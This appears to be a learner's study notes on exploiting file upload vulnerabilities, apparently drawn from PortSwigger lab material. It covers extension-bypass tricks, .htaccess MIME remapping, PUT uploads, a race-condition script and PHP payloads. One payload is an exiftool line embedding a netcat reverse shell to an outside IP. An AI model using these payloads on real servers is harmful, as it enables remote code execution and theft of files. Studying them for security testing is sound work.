
What is File Upload vulnerabilities?
File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size.

How do file upload vulnerabilities arise?
Given the fairly obvious dangers, it's rare for websites in the wild to have no restrictions whatsoever on which files users are allowed to upload. More commonly, developers implement what they believe to be robust validation that is either inherently flawed or can be easily bypassed.

Exploiting unrestricted file uploads to deploy a web shell
* One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type.
* Web servers often use the `filename` field in `multipart/form-data` requests to determine the name and location where the file should be saved, use Directory Traversal to affect where the file will be saved.
* Blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as `.php5`, `.shtml`, and so on.

Obfuscating file extensions
* You may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type.
* Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: `exploit.php.jpg`
-  Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
-  Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
-  Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
-  Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.
- Thir is a defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip `.php` from the following filename:`exploit.p.phphp`

Flawed validation of the file's contents
Using special tools, such as ExifTool, it can be trivial to create a polyglot file containing malicious code within its metadata.
Example: exiftool -DocumentName="<?php system(‘nc 192.168.31.41 4444 -e /bin/bash’); __halt_compiler(); ?>" [filename]

Exploiting file upload vulnerabilities without remote code execution
In the examples we've looked at so far, we've been able to upload server-side scripts for remote code execution. This is the most serious consequence of an insecure file upload function, but these vulnerabilities can still be exploited in other ways.

Uploading malicious client-side scripts
Although you might not be able to execute scripts on the server, you may still be able to upload scripts for client-side attacks. For example, if you can upload HTML files or SVG images, you can potentially use `<script>` tags to create [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) payloads.

Exploiting vulnerabilities in the parsing of uploaded files
If the uploaded file seems to be both stored and served securely, the last resort is to try exploiting vulnerabilities specific to the parsing or processing of different file formats. For example, you know that the server parses XML-based files, such as Microsoft Office `.doc` or `.xls` files, this may be a potential vector for [XXE injection](https://portswigger.net/web-security/xxe) attacks.

Uploading files using PUT
It's worth noting that some web servers may be configured to support `PUT` requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface.

`PUT /images/exploit.php HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-httpd-php Content-Length: 49 <?php echo file_get_contents('/path/to/file'); ?>`

Upload a config file to add an extentsion link
In Burp Repeater, go to the tab for the `POST /my-account/avatar` request and find the part of the body that relates to your PHP file. Make the following changes:

-   Change the value of the `filename` parameter to .htaccess.
-   Change the value of the `Content-Type` header to text/plain.
-   Replace the contents of the file (your PHP payload) with the following Apache directive: 

AddType application/x-httpd-php .l33t
    
This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php. As the server uses the `mod_php` module, it knows how to handle this already.

#### Tip
You can try sending `OPTIONS` requests to different endpoints to test for any that advertise support for the `PUT` method.

Python Script for Race Condition
`def queueRequests(target, wordlists): 
	engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,) 
	request1 = '''<YOUR-POST-REQUEST>''' 
	request2 = '''<YOUR-GET-REQUEST>''' 
	# the 'gate' argument blocks the final byte of each request until openGate is invoked engine.queue(request1, gate='race1') 
	for x in range(5):
		engine.queue(request2, gate='race1') 
		# wait until every 'race1' tagged request is ready 
		# then send the final byte of each request 
		# (this method is non-blocking, just like queue) 
	engine.openGate('race1') 
	engine.complete(timeout=60) 

def handleResponse(req, interesting): 
	table.add(req)`

For getting file info: <?php echo file_get_contents('/home/carlos/secret'); ?>


